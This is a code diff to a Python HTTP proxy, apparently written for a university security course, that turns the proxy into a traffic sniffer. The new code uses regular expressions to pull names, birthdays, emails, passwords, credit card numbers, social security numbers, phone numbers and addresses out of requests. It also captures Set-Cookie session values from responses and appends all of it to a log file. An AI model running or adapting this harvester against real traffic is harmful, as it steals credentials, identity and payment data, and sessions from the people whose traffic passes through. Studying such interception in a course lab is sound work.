@@ -88,12 +88,17 @@ def handle_client(client_socket):
         host, port = get_destination_host_port(data)
         print("Handling request to host: {}, port: {}".format(host, port))
 
-        process_data(data)
+        # Process request data
+        process_data(data, 'request')
         # Forwarding the request to the destination server (simplified)
         server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         server_socket.connect((host, port))
         server_socket.sendall(request)
+
+        # Process server response
         response = server_socket.recv(4096)
+        response_data = response.decode('utf-8')
+        process_data(response_data, 'response')
         client_socket.sendall(response)
 
 def get_destination_host_port(request_data):
@@ -113,37 +118,60 @@ def get_destination_host_port(request_data):
                 return host, 80  # Default port for HTTP
     return None, None  # Host not found in the request
 
-def process_data(data):
-    # Regular expressions for different data types
-    info_patterns = {
-        'name': r'\b[A-Z][a-z]*\s[A-Z][a-z]*\b',  # Basic pattern for names, can be improved
-        'birthday': r'\b\d{4}-\d{2}-\d{2}\b',  # Format: YYYY-MM-DD
-        'email': r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b',
-        'password': r'password=[^&\s]*',
-        'address': r'\d+\s[A-z]+\s[A-z]+',  # Simple address pattern, might need refinement
-        'credit_card': r'\b\d{4}[\s\-]?\d{4}[\s\-]?\d{4}[\s\-]?\d{4}\b',  # Format: 1234 5678 9101 1121
-        'ssn': r'\b\d{3}-\d{2}-\d{4}\b',
-        'phone': r'\b\d{3}[\s\-]?\d{3}[\s\-]?\d{4}\b',  # Format: 123-456-7890
-        'city_state_zip': r'\b[A-Z][a-z]+,\s[A-Z]{2},\s\d{5}\b'  # Format: City, ST, 12345
-    }
+def process_data(data, data_type):
+    # Parse and log sensitive information from HTTP headers
+    if data_type == 'request':
+        parse_http_request(data)
+    elif data_type == 'response':
+        parse_http_response(data)
 
-    found_info = {}
-    for key, regex in info_patterns.items():
-        match = re.search(regex, data)
-        if match:
-            found_info[key] = match.group()
-
-    if found_info:
-        log_info(found_info)
-    
+    # Existing debug print
     if DEBUG:
         print(data)
 
-def log_info(info):
+# Example: http://cs468.cs.uic.edu/submit?firstname=andrea&lastname=papa&birthday=2222-12-22&email=trial%40gmail.com&password=123465676&address=2343+West+Taylor+Street&credit-card=1234567812345678&social-security=111-11-1111&phone=123-404-9898&city=Chicago&state=IL&zip=55555
+def parse_http_request(data):
+    # Regular expressions for sensitive information
+    regex_patterns = {
+        'firstname_query': r'firstname=([^&\s]+)',
+        'lastname_query': r'lastname=([^&\s]+)',
+        'birthday_query': r'birthday=([^&\s]+)',
+        'email': r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b',
+        'password_query': r'password=([^&\s]+)',
+        'credit_card': r'\b(?:\d[ -]*?){13,16}\b',
+        'ssn': r'\b\d{3}-\d{2}-\d{4}\b',
+        'phone_number': r'\b\d{3}-\d{3}-\d{4}\b',
+        #'us_address': r'\d{1,6}\s(?:[A-Za-z0-9#]+\s){0,7}(?:Street|St|Avenue|Ave|Road|Rd|Boulevard|Blvd|Drive|Dr|Court|Ct|Lane|Ln|Way)\b',
+        'address_query': r'address=([^&]+)',
+        'address': r'\d{1,6}(\s|\+)[A-Za-z0-9#\s\+,.]+(?:Street|St\.?|Avenue|Ave\.?|Road|Rd\.?|Boulevard|Blvd\.?|Drive|Dr\.?|Court|Ct\.?|Lane|Ln|Way|Plaza|Plz)\b',
+        'city_query': r'city=([^&\s]+)',
+        'state_query': r'state=([^&\s]+)',
+        'zip_query': r'zip=([^&\s]+)'
+    }
+
+    output = {}
+    # Check and log each pattern
+    for key, pattern in regex_patterns.items():
+        matches = re.findall(pattern, data)
+        if matches:
+            output[key] = matches
+
+    log_info(output, 'request')
+
+def parse_http_response(data):
+    # Example for parsing specific response data
+    # Can be expanded based on requirements
+    if 'Set-Cookie:' in data:
+        cookies = re.findall(r'Set-Cookie: (.*?);', data)
+        log_info({'cookie': cookies}, 'response')
+
+def log_info(info, data_type):
     with open("info1.txt", "a") as f:
-        for key, value in info.items():
-            f.write(f"{key}: {value}\n")
-        f.write("\n")  # Adds a new line for separation between entries
+        f.write(f"--- {data_type.upper()} DATA ---\n")
+        for key, values in info.items():
+            for value in values:
+                f.write(f"{key}: {value}\n")
+        f.write("\n")
 
 
 if __name__ == "__main__":
